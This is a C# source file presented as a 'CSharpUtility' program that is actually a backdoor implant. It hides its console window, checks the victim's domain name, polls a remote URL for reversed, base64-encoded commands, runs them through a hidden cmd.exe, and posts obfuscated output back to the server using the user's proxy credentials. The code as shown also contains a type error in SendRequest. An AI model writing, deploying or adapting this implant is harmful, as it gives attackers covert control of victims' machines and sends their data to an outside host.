using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace CSharpUtility
{

    class Program
    {
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr VAR102, UInt32 VAR101);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        static void Execute(string cmd, string url)
        {
            StringBuilder sb = new StringBuilder();
            try
            {
                Process p = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;

                startInfo.UseShellExecute = false;
                startInfo.RedirectStandardOutput = true;
                startInfo.RedirectStandardError = true;
                startInfo.FileName = "cmd.exe";
                startInfo.CreateNoWindow = true;
                startInfo.Arguments = "/c " + cmd;
                p.StartInfo = startInfo;
                p.Start();

                sb.Append(p.StandardOutput.ReadToEnd());
                sb.Append("\r\nError:" + p.StandardError.ReadToEnd() + "\r\n");
            }
            catch (Exception e)
            {

            }
            SendRequest(url, sb.ToString());
            
        }

        static void SendRequest(string url, string data)
        {
            WebClient client = new WebClient();
            IWebProxy defaultProxy = WebRequest.DefaultWebProxy;
            if (defaultProxy != null)
            {
                defaultProxy.Credentials = CredentialCache.DefaultCredentials;
                client.Proxy = defaultProxy;
            }

            if(data.Equals(""))
            {
                return client.DownloadData(url + "?" + Environment.GetEnvironmentVariable("USERNAME"));
            }
            else
            {
                string dataPost = Convert.ToBase64String(Encoding.ASCII.GetBytes(data));
                dataPost = dataPost.Replace("A", "!)(*&#:<]");
                client.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                client.UploadString(url, dataPost);
            }
        }

        static void Main(string[] args)
        {
            string url = args.Length > 1 ? args[0] : "URL";
            string currentMd5 = "";
            ShowWindow(GetConsoleWindow(), 0);
            if (Environment.GetEnvironmentVariable("USERDOMAIN") == "CHANGEME")
            {
                while (true)
                {
                    byte[] cmd = SendRequest(url, "");
                    Array.Reverse(cmd, 0, cmd.Length);
                    string run = Encoding.ASCII.GetString(Convert.FromBase64String(Encoding.ASCII.GetString(cmd)));

                    MD5 md5 = MD5.Create();
                    string md5Result = Encoding.ASCII.GetString(md5.ComputeHash(Encoding.ASCII.GetBytes(run)));

                    if (!md5Result.Equals(currentMd5))
                    {
                        if (run.Length > 0)
                        {
                            Thread t = new Thread(() => Execute(run, url));
                            t.Start();
                            Thread.Sleep(10000);
                        }
                    }
                    currentMd5 = md5Result;
                }
            }
        }
    }
}
